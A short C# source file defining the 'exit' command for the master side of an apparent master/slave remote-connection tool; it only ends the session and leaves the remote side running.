using Master.Commands.Core;
using Shared;
using System.Collections.Generic;

namespace Master.Commands
{
    internal class Exit : IMasterCommand
    {
        public string name { get; } = "exit";

        public string description { get; } = "Stop the connection\nThe slave remains active, allowing further connections if wanted";

        public bool isLocal { get; } = true;

        public List<string> validArguments { get; } = null;

        public void Process(List<string> args)
        {
            throw new ExitException();
        }
    }
}
